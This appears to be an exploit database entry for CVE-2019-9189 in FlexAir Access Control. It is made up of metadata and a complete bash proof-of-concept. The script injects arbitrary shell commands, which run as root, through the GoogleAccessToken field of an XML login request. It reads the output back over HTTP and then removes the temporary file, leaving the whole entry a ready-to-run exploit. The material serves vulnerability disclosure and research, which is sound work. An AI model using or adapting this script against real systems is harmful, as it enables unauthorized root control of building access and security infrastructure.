# Exploit Title: FlexAir Access Control 2.4.9api3 - Remote Code Execution
# Google Dork: NA
# Date: 2019-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
# Software Link: https://www.computrols.com/building-automation-software/
# Version: 2.4.9api3
# Tested on: NA
# CVE : CVE-2019-9189
# Advisory: https://applied-risk.com/resources/ar-2019-007
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system

# PoC

#!/bin/bash
#
# Command injection with root privileges in FlexAir Access Control (Prima Systems)
# Firmware version: <= 2.3.38

#
# Discovered by Sipke Mellema
# Updated: 14.01.2019
#
##########################################################################
#
# $ ./Nova2.3.38_cmd.sh 192.168.13.37 "id"
# Executing: id
# Output:
# uid=0(root) gid=0(root) groups=0(root),10(wheel)
# Removing temporary file..
# Done
#
##########################################################################
# Output file on the server
OUTPUT_FILE="/www/pages/app/images/logos/output.txt"
# Command to execute
CMD="$2"
# IP address
IP="$1"
# Change HTTP to HTTPS if required
HOST="http://${IP}"
# Add output file
CMD_FULL="${CMD}>${OUTPUT_FILE}"
# Command injection payload. Be careful with single quotes!
PAYLOAD="<requests><request name='LoginUser'><param name='UsrName' value='test'/><param name='UsrEMail' value='test@test.com'/><param name='GoogleAccessToken' value='test;${CMD_FULL}'/></request></requests>"

# Perform exploit
echo "Executing: ${CMD}"
curl --silent --output /dev/null -X POST -d "${PAYLOAD}" "${HOST}/bin/sysfcgi.fx"
# Get output
echo "Output:"
curl -s "${HOST}/app/images/logos/output.txt"
# Remove temp file
echo "Removing temporary file.."
PAYLOAD="<requests><request name='LoginUser'><param name='UsrName' value='test'/><param name='UsrEMail' value='test@test.com'/><param name='GoogleAccessToken' value='test;rm /www/pages/app/images/logos/output.txt'/></request></requests>"
curl --silent --output /dev/null -X POST -d "${PAYLOAD}" "${HOST}/bin/sysfcgi.fx"
echo "Done"